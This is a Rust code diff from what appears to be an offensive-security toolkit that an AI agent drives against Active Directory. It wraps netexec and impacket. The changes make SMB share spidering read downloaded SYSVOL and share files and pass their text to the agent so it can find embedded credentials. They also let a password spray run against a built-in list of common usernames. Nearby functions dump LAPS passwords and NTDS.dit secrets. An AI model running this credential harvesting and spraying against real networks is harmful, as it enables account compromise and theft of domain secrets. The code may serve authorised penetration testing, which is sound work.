@@ -80,6 +80,9 @@ pub async fn gpp_password_finder(args: &Value) -> Result<ToolOutput> {
 }
 
 /// Spider SYSVOL for scripts and config files via `netexec smb -M spider_plus`.
+///
+/// After the spider runs, reads downloaded text files and appends their contents
+/// to the output so the agent can search for embedded credentials.
 pub async fn sysvol_script_search(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
     let username = required_str(args, "username")?;
@@ -88,7 +91,7 @@ pub async fn sysvol_script_search(args: &Value) -> Result<ToolOutput> {
 
     let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));
 
-    CommandBuilder::new("netexec")
+    let mut output = CommandBuilder::new("netexec")
         .arg("smb")
         .arg(target)
         .args(cred_args)
@@ -96,7 +99,15 @@ pub async fn sysvol_script_search(args: &Value) -> Result<ToolOutput> {
         .flag("-o", "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400")
         .timeout_secs(300)
         .execute()
-        .await
+        .await?;
+
+    // Append downloaded file contents (same logic as smbclient_spider)
+    let extra = read_spider_downloads(target).await;
+    if !extra.is_empty() {
+        output.stdout.push_str(&extra);
+    }
+
+    Ok(output)
 }
 
 /// Dump LAPS passwords via `netexec ldap -M laps`.
@@ -155,6 +166,9 @@ pub async fn ldap_search_descriptions(args: &Value) -> Result<ToolOutput> {
 }
 
 /// Spider SMB shares for interesting files via `netexec smb -M spider_plus`.
+///
+/// After the spider runs, reads the metadata JSON and any downloaded text files,
+/// appending their contents to the output so the agent can see actual file data.
 pub async fn smbclient_spider(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
     let username = required_str(args, "username")?;
@@ -173,7 +187,7 @@ pub async fn smbclient_spider(args: &Value) -> Result<ToolOutput> {
         opts.push_str(&format!(" DEPTH={d}"));
     }
 
-    CommandBuilder::new("netexec")
+    let mut output = CommandBuilder::new("netexec")
         .arg("smb")
         .arg(target)
         .args(cred_args)
@@ -181,7 +195,114 @@ pub async fn smbclient_spider(args: &Value) -> Result<ToolOutput> {
         .flag("-o", &opts)
         .timeout_secs(300)
         .execute()
-        .await
+        .await?;
+
+    // Append downloaded file contents
+    let extra = read_spider_downloads(target).await;
+    if !extra.is_empty() {
+        output.stdout.push_str(&extra);
+    }
+
+    Ok(output)
+}
+
+/// Read spider_plus downloaded files and metadata, returning text to append to output.
+///
+/// spider_plus saves metadata to `/root/.nxc/modules/nxc_spider_plus/{ip}.json`
+/// and downloads files to `/root/.nxc/modules/nxc_spider_plus/{ip}/`.
+async fn read_spider_downloads(target: &str) -> String {
+    let spider_dir = format!("/root/.nxc/modules/nxc_spider_plus/{target}");
+    let metadata_path = format!("{spider_dir}.json");
+
+    let mut extra = String::new();
+
+    // Include metadata JSON (file listing per share)
+    if let Ok(meta) = tokio::fs::read_to_string(&metadata_path).await {
+        extra.push_str("\n\n=== Spider Metadata (files found per share) ===\n");
+        extra.push_str(&meta);
+    }
+
+    // Walk the download directory and include text file contents
+    if tokio::fs::metadata(&spider_dir).await.is_err() {
+        return extra;
+    }
+
+    extra.push_str("\n\n=== Downloaded File Contents ===\n");
+    let mut files_read = 0usize;
+    let mut dirs_to_walk = vec![spider_dir.clone()];
+
+    const TEXT_EXTS: &[&str] = &[
+        "txt",
+        "xml",
+        "ini",
+        "conf",
+        "cfg",
+        "ps1",
+        "bat",
+        "cmd",
+        "vbs",
+        "js",
+        "py",
+        "sh",
+        "json",
+        "yaml",
+        "yml",
+        "csv",
+        "log",
+        "reg",
+        "inf",
+        "pol",
+        "asp",
+        "aspx",
+        "config",
+        "properties",
+    ];
+
+    while let Some(dir) = dirs_to_walk.pop() {
+        let mut dir_entries = match tokio::fs::read_dir(&dir).await {
+            Ok(e) => e,
+            Err(_) => continue,
+        };
+        while let Ok(Some(entry)) = dir_entries.next_entry().await {
+            let path = entry.path();
+            if path.is_dir() {
+                dirs_to_walk.push(path.to_string_lossy().to_string());
+                continue;
+            }
+            let ext = path
+                .extension()
+                .and_then(|e| e.to_str())
+                .unwrap_or("")
+                .to_lowercase();
+            if !TEXT_EXTS.contains(&ext.as_str()) {
+                continue;
+            }
+            if let Ok(contents) = tokio::fs::read_to_string(&path).await {
+                let rel = path
+                    .strip_prefix(&spider_dir)
+                    .unwrap_or(&path)
+                    .to_string_lossy();
+                extra.push_str(&format!("\n--- {rel} ---\n"));
+                // Cap per-file output at 8KB to avoid blowing up context
+                if contents.len() > 8192 {
+                    extra.push_str(&contents[..8192]);
+                    extra.push_str("\n... [truncated]\n");
+                } else {
+                    extra.push_str(&contents);
+                }
+                files_read += 1;
+                if files_read >= 50 {
+                    extra.push_str("\n... [50 file limit reached, remaining files omitted]\n");
+                    break;
+                }
+            }
+        }
+        if files_read >= 50 {
+            break;
+        }
+    }
+
+    extra
 }
 
 /// Extract NTDS.dit secrets via `impacket-secretsdump -ntds drsuapi`.
@@ -227,23 +348,40 @@ pub async fn password_policy(args: &Value) -> Result<ToolOutput> {
 /// Spray a single password across a user list via `netexec smb`.
 pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
-    let users_file = required_str(args, "users_file")?;
+    let users_file = optional_str(args, "users_file");
     let password = required_str(args, "password")?;
     let domain = required_str(args, "domain")?;
     let delay_seconds = optional_i64(args, "delay_seconds");
 
+    // Use provided file or generate a default wordlist
+    let tmp_file;
+    let wordlist_path = if let Some(uf) = users_file {
+        uf.to_string()
+    } else {
+        tmp_file = format!("/tmp/spray_pw_{}.txt", std::process::id());
+        std::fs::write(&tmp_file, DEFAULT_SPRAY_USERNAMES)?;
+        tmp_file
+    };
+
     let cred_args = credentials::netexec_creds(None, Some(password), None, Some(domain));
 
-    CommandBuilder::new("netexec")
+    let result = CommandBuilder::new("netexec")
         .arg("smb")
         .arg(target)
-        .flag("-u", users_file)
+        .flag("-u", &wordlist_path)
         .args(cred_args)
         .arg("--continue-on-success")
         .flag_opt("--jitter", delay_seconds.map(|d| d.to_string()))
         .timeout_secs(300)
         .execute()
-        .await
+        .await;
+
+    // Clean up temp file if we created one
+    if users_file.is_none() {
+        let _ = std::fs::remove_file(&wordlist_path);
+    }
+
+    result
 }
 
 /// Common AD usernames for fallback when no users_file is provided.
